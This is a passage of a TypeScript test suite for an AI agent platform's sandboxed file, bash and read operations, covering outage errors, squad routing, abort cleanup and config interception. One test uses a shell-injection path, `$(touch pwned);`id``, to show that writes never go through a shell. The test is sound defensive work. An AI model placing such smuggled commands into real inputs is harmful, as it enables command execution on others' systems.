  test('a 500 (fs failure on a NEW bundle) still propagates', async () => {
    const client = {
      mkdir: mock(async () => {
        throw new SandboxHttpError('EACCES: permission denied', 500)
      }),
    }
    const ops = createHttpWriteOperations(managerWith(client), 'agent_a1')

    await expect(ops.mkdir('/home/member/readonly/dir')).rejects.toThrow('EACCES')
  })

  test('a connection error (no HTTP status) still propagates through outage mapping', async () => {
    const registerSpy = spyOn(sandboxRecoveryWatch, 'register').mockResolvedValue(undefined)
    try {
      const client = {
        mkdir: mock(async () => {
          throw new Error('Sandbox is not reachable (pod may be starting or stopped). URL: http://x')
        }),
      }
      // Box reported down → the outage mapper substitutes the structured error.
      const ops = createHttpWriteOperations(managerWith(client, 'stopped'), 'agent_a1')

      await expect(ops.mkdir('/home/member/workspace/dir')).rejects.toThrow(/currently unavailable/)
    } finally {
      registerSpy.mockRestore()
    }
  })

  test('deploy-window path: the SDK write TOOL succeeds when mkdir 404s — writeFile createDirs is the backstop', async () => {
    const mkdirMock = mock(async () => {
      throw new SandboxHttpError('Request failed: 404', 404)
    })
    const writeMock = mock(async () => ({ bytesWritten: 2 }))
    const manager = managerWith({ mkdir: mkdirMock, write: writeMock })
    const tools = createK8sSandboxedCodingTools('/ignored', 'agent_a1', manager)
    const write = tools.find((t) => t.key === 'write')!

    const result = await write.execute('tc', { path: '/home/member/workspace/new/notes.md', content: 'hi' } as any)

    expect(mkdirMock).toHaveBeenCalledWith({ path: '/home/member/workspace/new' })
    expect(writeMock).toHaveBeenCalledWith({
      path: '/home/member/workspace/new/notes.md',
      content: Buffer.from('hi').toString('base64'),
      createDirs: true,
    })
    expect(JSON.stringify(result)).toContain('Successfully wrote')
  })
})

describe('resolveSquadFileRoute (vm-only toolkit gate)', () => {
  let prev: string | undefined
  function withRuntime(value: string | undefined, fn: () => void) {
    prev = process.env.FICUS_SANDBOX_RUNTIME
    if (value === undefined) delete process.env.FICUS_SANDBOX_RUNTIME
    else process.env.FICUS_SANDBOX_RUNTIME = value
    try {
      fn()
    } finally {
      if (prev === undefined) delete process.env.FICUS_SANDBOX_RUNTIME
      else process.env.FICUS_SANDBOX_RUNTIME = prev
    }
  }

  test('vm runtime + squadId → squad warm box id + vm squad workspace root', () => {
    withRuntime('vm', () => {
      expect(resolveSquadFileRoute('sq1')).toEqual({
        sandboxId: 'squad_sq1',
        workspaceRoot: `/home/${boxUnixUser('squad_sq1')}/workspace`,
      })
    })
  })

  test('container runtimes never get a route (k8s, docker/unset)', () => {
    withRuntime('k8s', () => expect(resolveSquadFileRoute('sq1')).toBeUndefined())
    withRuntime(undefined, () => expect(resolveSquadFileRoute('sq1')).toBeUndefined())
  })

  test('solo agents (no squadId) never get a route, even on vm', () => {
    withRuntime('vm', () => expect(resolveSquadFileRoute(undefined)).toBeUndefined())
  })
})

describe('toolkit wiring: squad members carry the squad route on vm only', () => {
  function routedManager() {
    const calls: string[] = []
    const client = {
      read: mock(async () => ({ content: Buffer.from('x').toString('base64'), totalSize: 1 })),
      stat: mock(async () => ({ exists: true })),
    }
    const manager = {
      getClientForSandbox: mock((id: string) => {
        calls.push(id)
        return client
      }),
      getSandboxStatus: mock(async () => ({ status: 'running' })),
    } as unknown as K8sSandboxManager
    return { manager, calls }
  }

  function withRuntime(value: string, fn: () => Promise<void>) {
    const prev = process.env.FICUS_SANDBOX_RUNTIME
    process.env.FICUS_SANDBOX_RUNTIME = value
    return fn().finally(() => {
      if (prev === undefined) delete process.env.FICUS_SANDBOX_RUNTIME
      else process.env.FICUS_SANDBOX_RUNTIME = prev
    })
  }

  test('vm: a squad member read on a squad-workspace path hits the squad warm box client', async () => {
    await withRuntime('vm', async () => {
      const { manager, calls } = routedManager()
      const tools = createK8sSandboxedCodingTools('/ignored', 'agent_a1', manager, undefined, 'sq1')
      const read = tools.find((t) => t.key === 'read')!
      const squadWorkspace = `/home/${boxUnixUser('squad_sq1')}/workspace`

      await read.execute('tc', { path: `${squadWorkspace}/src/app.ts` } as any)

      expect(calls).toContain('squad_sq1')
      expect(calls).not.toContain('agent_a1')
    })
  })

  test('k8s: the same squad member read stays on the member client (no squadRoute)', async () => {
    await withRuntime('k8s', async () => {
      const { manager, calls } = routedManager()
      const tools = createK8sSandboxedCodingTools('/ignored', 'agent_a1', manager, undefined, 'sq1')
      const read = tools.find((t) => t.key === 'read')!

      await read.execute('tc', { path: '/workspace/sq1/src/app.ts' } as any)

      expect(calls).toContain('agent_a1')
      expect(calls).not.toContain('squad_sq1')
    })
  })

  test('vm: the write TOOL (pi SDK, mkdir-before-write) sends a metachar squad path as data — no shell', async () => {
    // The SDK write tool calls ops.mkdir(dirname) before ops.writeFile on every
    // write. This locks the full tool path: both legs hit the squad client as
    // structured RPCs and client.bash is never touched.
    await withRuntime('vm', async () => {
      const mkdirMock = mock(async () => ({ ok: true }))
      const writeMock = mock(async () => ({}))
      const bashMock = mock(() => {
        throw new Error('write tool must never shell out via client.bash')
      })
      const manager = {
        getClientForSandbox: mock(() => ({ mkdir: mkdirMock, write: writeMock, bash: bashMock })),
        getSandboxStatus: mock(async () => ({ status: 'running' })),
      } as unknown as K8sSandboxManager
      const tools = createK8sSandboxedCodingTools('/ignored', 'agent_a1', manager, undefined, 'sq1')
      const write = tools.find((t) => t.key === 'write')!
      const squadWorkspace = `/home/${boxUnixUser('squad_sq1')}/workspace`

      const evilDir = `${squadWorkspace}/$(touch pwned);\`id\``
      await write.execute('tc', { path: `${evilDir}/notes.md`, content: 'hi' } as any)

      expect(mkdirMock).toHaveBeenCalledWith({ path: evilDir })
      expect(writeMock).toHaveBeenCalledWith({
        path: `${evilDir}/notes.md`,
        content: Buffer.from('hi').toString('base64'),
        createDirs: true,
      })
      expect(bashMock).not.toHaveBeenCalled()
    })
  })

  test('vm: a solo agent (no squadId) never routes to a squad box', async () => {
    await withRuntime('vm', async () => {
      const { manager, calls } = routedManager()
      const tools = createK8sSandboxedCodingTools('/ignored', 'agent_a1', manager, undefined, undefined)
      const read = tools.find((t) => t.key === 'read')!

      await read.execute('tc', { path: `/home/${boxUnixUser('agent_a1')}/.private/x.ts` } as any)

      expect(calls.length).toBeGreaterThan(0)
      expect(new Set(calls)).toEqual(new Set(['agent_a1']))
    })
  })
})

describe('sandbox outage mapping', () => {
  function deadBoxManager(mockStream?: MockStream) {
    return {
      getClientForSandbox: mock(() => (mockStream ? { bash: mock(() => mockStream) } : null)),
      getSandboxStatus: mock(async () => ({ status: 'failed', reason: 'OOMKilled' })),
      podManager: { namespace: 'tau-sandboxes' },
    } as unknown as K8sSandboxManager
  }

  test('bash stream error on a dead box rejects with a structured outage error and registers a watch', async () => {
    const registerSpy = spyOn(sandboxRecoveryWatch, 'register').mockResolvedValue(undefined)
    try {
      const mockStream = createMockStream()
      const manager = deadBoxManager(mockStream)
      const operations = createHttpBashOperations(manager, 'agent_a1')

      const execPromise = operations.exec('command', '/private', { onData: () => {} })
      mockStream.emitError(new Error('connection lost'))

      await expect(execPromise).rejects.toThrow(/currently unavailable.*OOMKilled/s)
      expect(registerSpy).toHaveBeenCalledWith(
        expect.objectContaining({ agentId: 'a1', sandboxIds: ['agent_a1'], crash: true })
      )
    } finally {
      registerSpy.mockRestore()
    }
  })

  test('missing client on a dead box surfaces the structured outage error instead of "no client"', async () => {
    const registerSpy = spyOn(sandboxRecoveryWatch, 'register').mockResolvedValue(undefined)
    try {
      const manager = deadBoxManager()
      const operations = createHttpBashOperations(manager, 'agent_a1')

      await expect(operations.exec('command', '/private', { onData: () => {} })).rejects.toThrow(
        /currently unavailable/
      )
    } finally {
      registerSpy.mockRestore()
    }
  })

  test('an explicit agentId (squad_bash) is used for watch registration on squad boxes', async () => {
    const registerSpy = spyOn(sandboxRecoveryWatch, 'register').mockResolvedValue(undefined)
    try {
      const mockStream = createMockStream()
      const manager = deadBoxManager(mockStream)
      const operations = createHttpBashOperations(manager, 'squad_s1', undefined, { agentId: 'a9' })

      const execPromise = operations.exec('command', '/workspace/s1', { onData: () => {} })
      mockStream.emitError(new Error('connection lost'))

      await expect(execPromise).rejects.toThrow(/shared squad box/)
      expect(registerSpy).toHaveBeenCalledWith(expect.objectContaining({ agentId: 'a9', sandboxIds: ['squad_s1'] }))
    } finally {
      registerSpy.mockRestore()
    }
  })

  test('read failure on a dead box surfaces the structured outage error', async () => {
    const registerSpy = spyOn(sandboxRecoveryWatch, 'register').mockResolvedValue(undefined)
    try {
      const manager = {
        getClientForSandbox: mock(() => ({
          read: mock(async () => {
            throw new Error('fetch failed')
          }),
        })),
        getSandboxStatus: mock(async () => ({ status: 'not_found' })),
      } as unknown as K8sSandboxManager
      const operations = createHttpReadOperations(manager, 'agent_a1')

      await expect(operations.readFile('/private/foo.txt')).rejects.toThrow(/currently unavailable/)
    } finally {
      registerSpy.mockRestore()
    }
  })

  test('bash stream error on a healthy box passes the original error through', async () => {
    const mockStream = createMockStream()
    const manager = {
      getClientForSandbox: mock(() => ({ bash: mock(() => mockStream) })),
      getSandboxStatus: mock(async () => ({ status: 'running' })),
      podManager: { namespace: 'tau-sandboxes' },
    } as unknown as K8sSandboxManager
    const operations = createHttpBashOperations(manager, 'agent_a1')

    const execPromise = operations.exec('command', '/private', { onData: () => {} })
    mockStream.emitError(new Error('connection lost'))

    await expect(execPromise).rejects.toThrow('connection lost')
  })
})

describe('createHttpBashOperations', () => {
  test('streams stdout via onData', async () => {
    const mockStream = createMockStream()
    const manager = createMockManager(mockStream)
    const operations = createHttpBashOperations(manager, 'test-sandbox')

    const chunks: Buffer[] = []
    const execPromise = operations.exec('echo hello', '/workspace', {
      onData: (data) => chunks.push(data),
    })

    // Simulate streaming response
    mockStream.emitData({ stdout: Buffer.from('hello\n').toString('base64') })
    mockStream.emitData({ exitCode: 0 })
    mockStream.emitEnd()

    const result = await execPromise

    expect(result.exitCode).toBe(0)
    expect(chunks.length).toBe(1)
    expect(chunks[0].toString()).toBe('hello\n')
  })

  test('streams stderr via onData', async () => {
    const mockStream = createMockStream()
    const manager = createMockManager(mockStream)
    const operations = createHttpBashOperations(manager, 'test-sandbox')

    const chunks: Buffer[] = []
    const execPromise = operations.exec('command', '/workspace', {
      onData: (data) => chunks.push(data),
    })

    // Simulate stderr output
    mockStream.emitData({ stderr: Buffer.from('error output\n').toString('base64') })
    mockStream.emitData({ exitCode: 1 })
    mockStream.emitEnd()

    const result = await execPromise

    expect(result.exitCode).toBe(1)
    expect(chunks.length).toBe(1)
    expect(chunks[0].toString()).toBe('error output\n')
  })

  test('returns exitCode from stream', async () => {
    const mockStream = createMockStream()
    const manager = createMockManager(mockStream)
    const operations = createHttpBashOperations(manager, 'test-sandbox')

    const execPromise = operations.exec('exit 42', '/workspace', {
      onData: () => {},
    })

    mockStream.emitData({ exitCode: 42 })
    mockStream.emitEnd()

    const result = await execPromise
    expect(result.exitCode).toBe(42)
  })

  test('rejects on stream error', async () => {
    const mockStream = createMockStream()
    const manager = createMockManager(mockStream)
    const operations = createHttpBashOperations(manager, 'test-sandbox')

    const execPromise = operations.exec('command', '/workspace', {
      onData: () => {},
    })

    mockStream.emitError(new Error('connection lost'))

    await expect(execPromise).rejects.toThrow('connection lost')
  })

  test('awaits remote cleanup after transport failure', async () => {
    const mockStream = createMockStream()
    const proof = Promise.withResolvers<void>()
    mockStream.cancelAndWait = mock(() => proof.promise)
    const operations = createHttpBashOperations(createMockManager(mockStream), 'test-sandbox')
    let settled = false
    const result = operations.exec('command', '/workspace', { onData: () => {} }).finally(() => {
      settled = true
    })
    mockStream.emitError(new Error('connection lost'))
    await Promise.resolve()
    expect(settled).toBe(false)
    proof.resolve()
    await expect(result).rejects.toThrow('connection lost')
    expect(mockStream.cancelAndWait).toHaveBeenCalledWith('transport-loss')
  })

  test('recovers transport only to prove same-invocation cleanup and never replays bash', async () => {
    const stream = createMockStream()
    stream.cancelAndWait = mock(async () => {
      throw new Error('dead client')
    })
    const recoveredCancel = mock(async () => {})
    const bash = mock(() => stream)
    const failedClient = { bash }
    const recoveredClient = { cancelBashInvocation: recoveredCancel }
    const manager = {
      getClientForSandbox: () => failedClient,
      getSandboxStatus: async () => ({ status: 'running' }),
      recoverClient: mock(async () => recoveredClient),
      podManager: { namespace: 'tau-sandboxes' },
    } as any
    const operations = createHttpBashOperations(manager, 'test-sandbox')
    const result = operations.exec('devbox install', '/workspace', { onData: () => {} })
    stream.emitError(new Error('The socket connection was closed unexpectedly'))

    await expect(result).rejects.toThrow('socket connection was closed unexpectedly')
    expect(bash).toHaveBeenCalledTimes(1)
    expect(recoveredCancel).toHaveBeenCalledWith('stable-invocation', 'transport-loss')
  })

  test('rejects on response error field', async () => {
    const mockStream = createMockStream()
    const manager = createMockManager(mockStream)
    const operations = createHttpBashOperations(manager, 'test-sandbox')

    const execPromise = operations.exec('command', '/workspace', {
      onData: () => {},
    })

    mockStream.emitData({ error: 'Command not found' })

    await expect(execPromise).rejects.toThrow('Command not found')
  })

  test('handles abort signal by cancelling stream', async () => {
    const mockStream = createMockStream()
    const manager = createMockManager(mockStream)
    const operations = createHttpBashOperations(manager, 'test-sandbox')

    const controller = new AbortController()
    const execPromise = operations.exec('long-running-command', '/workspace', {
      onData: () => {},
      signal: controller.signal,
    })

    // Abort the command
    controller.abort()

    await expect(execPromise).rejects.toThrow('Command aborted')
    expect(mockStream.cancelAndWait).toHaveBeenCalledWith('tool-abort')
  })

  test('awaits remote cleanup proof before abort settlement', async () => {
    const mockStream = createMockStream()
    const proof = Promise.withResolvers<void>()
    const cancelObserved = Promise.withResolvers<void>()
    mockStream.cancelAndWait = mock(() => {
      cancelObserved.resolve()
      return proof.promise
    })
    const operations = createHttpBashOperations(createMockManager(mockStream), 'test-sandbox')
    const controller = new AbortController()
    let settled = false
    const result = operations
      .exec('sleep', '/workspace', { onData: () => {}, signal: controller.signal })
      .finally(() => {
        settled = true
      })
    controller.abort()
    const watchdog = Promise.withResolvers<'cancel-observed' | 'watchdog'>()
    cancelObserved.promise.then(() => watchdog.resolve('cancel-observed'))
    setImmediate(() => watchdog.resolve('watchdog'))
    const barrier = await watchdog.promise
    let assertionFailure: unknown
    try {
      expect(barrier).toBe('cancel-observed')
      expect(settled).toBe(false)
    } catch (error) {
      assertionFailure = error
    } finally {
      proof.resolve()
      if (barrier === 'watchdog') mockStream.emitError(new Error('test-owned abort release'))
      await result.catch(() => undefined)
    }
    if (assertionFailure) throw assertionFailure
    await expect(result).rejects.toThrow('Command aborted')
  })

  test.each(['clean', 'failed'] as const)(
    'abort owns settlement when stream ends before %s cleanup',
    async (cleanup) => {
      const stream = createMockStream()
      const proof = Promise.withResolvers<void>()
      stream.cancelAndWait = mock(() => {
        // SandboxClient aborts its HTTP reader before awaiting remote cleanup.
        stream.emitEnd()
        return proof.promise
      })
      const manager = createMockManager(stream)
      const controller = new AbortController()
      let settled = false
      const result = createHttpBashOperations(manager, 'test-sandbox')
        .exec('long-running-command', '/workspace', { onData: () => {}, signal: controller.signal })
        .finally(() => {
          settled = true
        })
      const observed = result.catch((error: unknown) => error)
      controller.abort()
      try {
        await Promise.resolve()
        expect(settled).toBe(false)
      } finally {
        if (cleanup === 'clean') proof.resolve()
        else proof.reject(new Error('remote process still alive'))
        await observed
      }
      await expect(result).rejects.toThrow(
        cleanup === 'clean' ? 'Command aborted' : 'could not confirm all of its processes exited'
      )
      expect(manager.getClientForSandbox).toHaveBeenCalledTimes(1)
      expect(stream.cancelAndWait).toHaveBeenCalledTimes(1)
    }
  )

  test('stream end without an exit code requires cleanup and rejects instead of succeeding', async () => {
    const stream = createMockStream()
    const proof = Promise.withResolvers<void>()
    stream.cancelAndWait = mock(() => proof.promise)
    let settled = false
    const result = createHttpBashOperations(createMockManager(stream), 'test-sandbox')
      .exec('command', '/workspace', { onData: () => {} })
      .finally(() => {
        settled = true
      })
    const observed = result.catch((error: unknown) => error)
    stream.emitEnd()
    try {
      await Promise.resolve()
      expect(settled).toBe(false)
      expect(stream.cancelAndWait).toHaveBeenCalledWith('transport-loss')
    } finally {
      proof.resolve()
      await observed
    }
    await expect(result).rejects.toThrow('Ficus stopped it and confirmed none of its processes are still running')
  })

  test('a lost outcome tells the agent what happened and what to do, never that proof is missing', async () => {
    for (const cleanup of ['confirmed', 'unconfirmed'] as const) {
      const stream = createMockStream()
      if (cleanup === 'unconfirmed')
        stream.cancelAndWait = mock(async () => {
          throw new Error('Bash cancellation cleanup did not settle before its deadline')
        })
      const result = createHttpBashOperations(createMockManager(stream), 'test-sandbox').exec('command', '/workspace', {
        onData: () => {},
      })
      stream.emitEnd()
      const error = (await result.catch((caught: unknown) => caught)) as Error
      expect(error.message).toContain('Lost the connection to this command before it reported an exit code')
      expect(error.message).toContain('stable-invocation')
      expect(error.message).not.toMatch(/proof is required|receipt is required/i)
      expect(error.cause).toBeInstanceOf(BashOutcomeUnknownError)
      if (cleanup === 'confirmed') {
        expect(error.message).toContain('confirmed none of its processes are still running')
        expect(error.message).toContain('re-run it if needed')
      } else {
        expect(error.message).toContain('could not confirm it stopped (Bash cancellation cleanup did not settle')
        expect(error.message).toContain('Check with `ps`')
      }
    }
  })

  test('a lost outcome is logged with what arrived before it, never the command text', async () => {
    const stream = createMockStream()
    const priorWarn = console.warn
    const lines: string[] = []
    console.warn = (...args: unknown[]) => {
      lines.push(args.map(String).join(' '))
    }
    try {
      const result = createHttpBashOperations(createMockManager(stream), 'squad_test', undefined, {
        agentId: 'agent-1',
      }).exec('SECRET_COMMAND_TEXT', '/workspace', { onData: () => {}, timeout: 240 })
      stream.emitData({ invocation: { id: 'stable-invocation' } } as BashResponse)
      stream.emitData({ stdout: Buffer.from('twelve bytes').toString('base64') })
      stream.emitEnd()
      await result.catch(() => {})
    } finally {
      console.warn = priorWarn
    }
    const line = lines.find((entry) => entry.includes('Bash command lost its outcome'))
    expect(line).toBeDefined()
    const fields = JSON.parse(line!.slice(line!.indexOf('{')))
    expect(fields).toMatchObject({
      sandboxId: 'squad_test',
      agentId: 'agent-1',
      invocationId: 'stable-invocation',
      failureClass: 'protocol_truncated',
      started: true,
      frames: 2,
      outputBytes: 12,
      timeoutSeconds: 240,
      cleanup: 'confirmed',
      recoveredTransport: false,
      boxOutage: false,
    })
    expect(typeof fields.elapsedMs).toBe('number')
    expect(line).not.toContain('SECRET_COMMAND_TEXT')
  })

  test('handles pre-aborted signal', async () => {
    const mockStream = createMockStream()
    mockStream.cancelAndWait = mock(async () => {
      // Cancellation may synchronously trigger reader events, even before exec
      // returns. Install listeners before processing an already-aborted signal.
      mockStream.emitError(new Error('reader aborted'))
      mockStream.emitEnd()
    })
    const manager = createMockManager(mockStream)
    const operations = createHttpBashOperations(manager, 'test-sandbox')

    // Create already-aborted controller
    const controller = new AbortController()
    controller.abort()

    const execPromise = operations.exec('command', '/workspace', {
      onData: () => {},
      signal: controller.signal,
    })

    await expect(execPromise).rejects.toThrow('Command aborted')
    expect(mockStream.cancelAndWait).toHaveBeenCalledWith('tool-abort')
  })

  test('throws when sandbox client not found', async () => {
    const manager = {
      getClientForSandbox: mock(() => null),
    } as unknown as K8sSandboxManager

    const operations = createHttpBashOperations(manager, 'nonexistent-sandbox')

    await expect(
      operations.exec('command', '/workspace', {
        onData: () => {},
      })
    ).rejects.toThrow('No K8s sandbox client found for nonexistent-sandbox')
  })

  test('passes timeout to bash request', async () => {
    const mockStream = createMockStream()
    const bashMock = mock(() => mockStream)
    const manager = {
      getClientForSandbox: mock(() => ({
        bash: bashMock,
      })),
      podManager: { namespace: 'tau-sandboxes' },
    } as unknown as K8sSandboxManager

    const operations = createHttpBashOperations(manager, 'test-sandbox')

    const execPromise = operations.exec('command', '/custom/cwd', {
      onData: () => {},
      timeout: 30,
    })

    mockStream.emitData({ exitCode: 0 })
    mockStream.emitEnd()

    await execPromise

    expect(bashMock).toHaveBeenCalledWith({
      command: 'command',
      cwd: '/custom/cwd',
      timeoutSeconds: 30,
      // The live Core URL is always injected (overrides any stale baked value).
      env: { FICUS_API_URL: resolveSandboxApiUrl('tau-sandboxes') },
      sourceEnv: true,
      activateDevbox: true,
    })
  })

  test('does NOT forward the host/caller shell env into the pod — only injects deliberate vars', async () => {
    // pi-coding-agent's bash tool passes its whole process.env (getShellEnv) as options.env,
    // incl. the HOST PATH. The executor applies overrides on top of the pod's own env, so a
    // forwarded host PATH would clobber the pod's PATH — making global-profile tools like `gh`
    // unfindable on empty-devbox agent boxes (squad boxes only escape via their cached devbox
    // shellenv). The pod owns its PATH/HOME/etc; we forward NONE of the caller env, only the
    // deliberate FICUS_API_URL (+ token). Agent `bash` and `squad_bash` share this op, so both
    // behave identically.
    const mockStream = createMockStream()
    const bashMock = mock(() => mockStream)
    const manager = {
      getClientForSandbox: mock(() => ({
        bash: bashMock,
      })),
      podManager: { namespace: 'tau-sandboxes' },
    } as unknown as K8sSandboxManager

    const operations = createHttpBashOperations(manager, 'test-sandbox')

    const execPromise = operations.exec('command', '/workspace', {
      onData: () => {},
      // Stand-in for the host shell env pi-coding-agent forwards (PATH, HOME, etc.).
      env: { FOO: 'bar', BAZ: 'qux', PATH: '/opt/homebrew/bin:/usr/bin', HOME: '/Users/noah' },
    })

    mockStream.emitData({ exitCode: 0 })
    mockStream.emitEnd()

    await execPromise

    expect(bashMock).toHaveBeenCalledWith({
      command: 'command',
      cwd: '/workspace',
      timeoutSeconds: 180,
      // None of the caller/host env survives — not PATH, not HOME, not FOO/BAZ.
      env: { FICUS_API_URL: resolveSandboxApiUrl('tau-sandboxes') },
      sourceEnv: true,
      activateDevbox: true,
    })
  })

  test('injects the live Core URL and per-agent token, overriding caller env', async () => {
    const mockStream = createMockStream()
    const bashMock = mock(() => mockStream)
    const manager = {
      getClientForSandbox: mock(() => ({
        bash: bashMock,
      })),
      podManager: { namespace: 'tau-sandboxes' },
    } as unknown as K8sSandboxManager

    const operations = createHttpBashOperations(manager, 'test-sandbox', 'ficus_agent_xyz')

    // Caller passes a stale FICUS_API_URL; the live one must win.
    const execPromise = operations.exec('ficus whoami', '/private', {
      onData: () => {},
      env: { FICUS_API_URL: 'http://host.k3d.internal:1' },
    })

    mockStream.emitData({ exitCode: 0 })
    mockStream.emitEnd()

    await execPromise

    // The live URL (resolved here, port-independent in cluster test mode) replaces
    // the caller's stale ':1' value, proving the per-command override wins.
    const liveUrl = resolveSandboxApiUrl('tau-sandboxes')
    expect(liveUrl).not.toBe('http://host.k3d.internal:1')
    expect(bashMock).toHaveBeenCalledWith(
      expect.objectContaining({
        env: { FICUS_API_URL: liveUrl, FICUS_TOKEN: 'ficus_agent_xyz' },
      })
    )
  })

  test('streams both stdout and stderr in order', async () => {
    const mockStream = createMockStream()
    const manager = createMockManager(mockStream)
    const operations = createHttpBashOperations(manager, 'test-sandbox')

    const chunks: string[] = []
    const execPromise = operations.exec('command', '/workspace', {
      onData: (data) => chunks.push(data.toString()),
    })

    // Simulate interleaved output
    mockStream.emitData({ stdout: Buffer.from('out1\n').toString('base64') })
    mockStream.emitData({ stderr: Buffer.from('err1\n').toString('base64') })
    mockStream.emitData({ stdout: Buffer.from('out2\n').toString('base64') })
    mockStream.emitData({ exitCode: 0 })
    mockStream.emitEnd()

    await execPromise

    expect(chunks).toEqual(['out1\n', 'err1\n', 'out2\n'])
  })

  test('rejects when output is followed by end without an exit code', async () => {
    const mockStream = createMockStream()
    const manager = createMockManager(mockStream)
    const operations = createHttpBashOperations(manager, 'test-sandbox')

    const execPromise = operations.exec('command', '/workspace', {
      onData: () => {},
    })

    mockStream.emitData({ stdout: Buffer.from('partial output').toString('base64') })
    // Partial output is not evidence of successful completion.
    mockStream.emitEnd()

    await expect(execPromise).rejects.toThrow('Lost the connection to this command before it reported an exit code')
    expect(mockStream.cancelAndWait).toHaveBeenCalledWith('transport-loss')
  })
})

describe('createHttpReadOperations config path interception', () => {
  test('reads agent config files locally instead of via HTTP', async () => {
    // Skills are under config/skills and should be served locally.
    const skillPath = join(SKILLS_DIR, 'brainstorming', 'SKILL.md')
    const httpReadMock = mock()
    const manager = {
      getClientForSandbox: mock(() => ({
        read: httpReadMock,
        stat: mock(),
      })),
    } as unknown as K8sSandboxManager

    const ops = createHttpReadOperations(manager, 'test-sandbox')
    const content = await ops.readFile(skillPath)

    // Should have read locally — HTTP read should NOT be called
    expect(httpReadMock).not.toHaveBeenCalled()
    expect(content.length).toBeGreaterThan(0)
    expect(content.toString()).toContain('brainstorming')
  })

  test('reads agent config files locally via access', async () => {
    const skillPath = join(SKILLS_DIR, 'brainstorming', 'SKILL.md')
    const statMock = mock()
    const manager = {
      getClientForSandbox: mock(() => ({
        read: mock(),
        stat: statMock,
      })),
    } as unknown as K8sSandboxManager

    const ops = createHttpReadOperations(manager, 'test-sandbox')
    await ops.access(skillPath)
    expect(statMock).not.toHaveBeenCalled()
  })

  test('access throws for non-existent agent config path', async () => {
    const configPath = join(AGENT_DIR, 'nonexistent-file.txt')
    const manager = {
      getClientForSandbox: mock(() => ({
        read: mock(),
        stat: mock(),
      })),
    } as unknown as K8sSandboxManager

    const ops = createHttpReadOperations(manager, 'test-sandbox')
    await expect(ops.access(configPath)).rejects.toThrow()
  })

  test('reads materialized DB skills locally instead of via HTTP', async () => {
    const skillDir = join(MATERIALIZED_SKILLS_DIR, 'test-materialized-skill')
    const skillPath = join(skillDir, 'SKILL.md')
    mkdirSync(skillDir, { recursive: true })
    writeFileSync(skillPath, '# Test Materialized Skill\n')
    const httpReadMock = mock()
    const manager = {
      getClientForSandbox: mock(() => ({
        read: httpReadMock,
        stat: mock(),
      })),
    } as unknown as K8sSandboxManager

    try {
      const ops = createHttpReadOperations(manager, 'test-sandbox')
      const content = await ops.readFile(skillPath)

      expect(httpReadMock).not.toHaveBeenCalled()
      expect(content.toString()).toContain('Test Materialized Skill')
    } finally {
      rmSync(skillDir, { recursive: true, force: true })
    }
  })

  test('reads sandbox-scoped materialized DB skills locally instead of via HTTP', async () => {
    const skillDir = join(getSandboxSkillsDir('squad_abc123'), 'test-sandbox-skill')
    const skillPath = join(skillDir, 'SKILL.md')
    mkdirSync(skillDir, { recursive: true })
    writeFileSync(skillPath, '# Test Sandbox Skill\n')
    const httpReadMock = mock()
    const manager = {
      getClientForSandbox: mock(() => ({
        read: httpReadMock,
        stat: mock(),
      })),
    } as unknown as K8sSandboxManager

    try {
      const ops = createHttpReadOperations(manager, 'test-sandbox')
      const content = await ops.readFile(skillPath)

      expect(httpReadMock).not.toHaveBeenCalled()
      expect(content.toString()).toContain('Test Sandbox Skill')
    } finally {
      rmSync(skillDir, { recursive: true, force: true })
    }
  })

  test('access checks materialized DB skills locally instead of via HTTP', async () => {
    const skillDir = join(MATERIALIZED_SKILLS_DIR, 'test-materialized-skill-access')
    const skillPath = join(skillDir, 'SKILL.md')
    mkdirSync(skillDir, { recursive: true })
    writeFileSync(skillPath, '# Test Materialized Skill\n')
    const statMock = mock()
    const manager = {
      getClientForSandbox: mock(() => ({
        read: mock(),
        stat: statMock,
      })),
    } as unknown as K8sSandboxManager

    try {
      const ops = createHttpReadOperations(manager, 'test-sandbox')
      await ops.access(skillPath)

      expect(statMock).not.toHaveBeenCalled()
    } finally {
      rmSync(skillDir, { recursive: true, force: true })
    }
  })

  test('non-agent-config paths go through HTTP', async () => {
    const readMock = mock(() => ({ content: Buffer.from('file data').toString('base64'), totalSize: 9 }))
    const manager = {
      getClientForSandbox: mock(() => ({
        read: readMock,
        stat: mock(),
      })),
    } as unknown as K8sSandboxManager

    const ops = createHttpReadOperations(manager, 'test-sandbox')
    const content = await ops.readFile('/workspace/src/index.ts')

    expect(readMock).toHaveBeenCalledWith({ path: '/workspace/src/index.ts', offset: 0, limit: 1024 * 1024 })
    expect(content.toString()).toBe('file data')
  })

  test('paths under config/ but not locally served config directories go through HTTP', async () => {
    const readMock = mock(() => ({ content: Buffer.from('yaml data').toString('base64'), totalSize: 9 }))
    const manager = {
      getClientForSandbox: mock(() => ({
        read: readMock,
        stat: mock(),
      })),
    } as unknown as K8sSandboxManager

    const ops = createHttpReadOperations(manager, 'test-sandbox')
    // agent-types is under config/, not config/agent/
    const content = await ops.readFile(join(CONFIG_DIR, 'agent-types', 'engineer.yaml'))

    expect(readMock).toHaveBeenCalled()
    expect(content.toString()).toBe('yaml data')
  })

  test('extension files are intercepted locally', async () => {
    // Extensions are under AGENT_DIR/extensions/ and should be served locally.
    const extPath = join(AGENT_DIR, 'extensions', 'code-ast', 'index.ts')
    const httpReadMock = mock()
    const manager = {
      getClientForSandbox: mock(() => ({
        read: httpReadMock,
        stat: mock(),
      })),
    } as unknown as K8sSandboxManager

    const ops = createHttpReadOperations(manager, 'test-sandbox')
    const content = await ops.readFile(extPath)

    expect(httpReadMock).not.toHaveBeenCalled()
    expect(content.toString()).toContain('Code AST Extension')
  })
})

describe('cleanup failure causality', () => {
  test('preserves structured outage when cleanup fails', async () => {
    const stream = createMockStream()
    const cleanup = Object.assign(new Error('cleanup deadline'), { code: 'BASH_CLEANUP_UNPROVEN' })
    stream.cancelAndWait = mock(async () => {
      throw cleanup
    })
    const manager = {
      getClientForSandbox: mock(() => ({ bash: () => stream })),
      getSandboxStatus: mock(async () => ({ status: 'failed', reason: 'OOMKilled' })),
      podManager: { namespace: 'tau-sandboxes' },
    } as any
    const operations = createHttpBashOperations(manager, 'agent_a1')
    const result = operations.exec('sleep', '/workspace', { onData: () => {} })
    stream.emitError(new Error('connection lost'))
    await expect(result).rejects.toMatchObject({
      name: 'SandboxOutageError',
      code: 'SANDBOX_UNAVAILABLE',
      sandboxId: 'agent_a1',
      secondaryFailures: [cleanup],
    })
  })
})

describe('verified edit HTTP commit', () => {
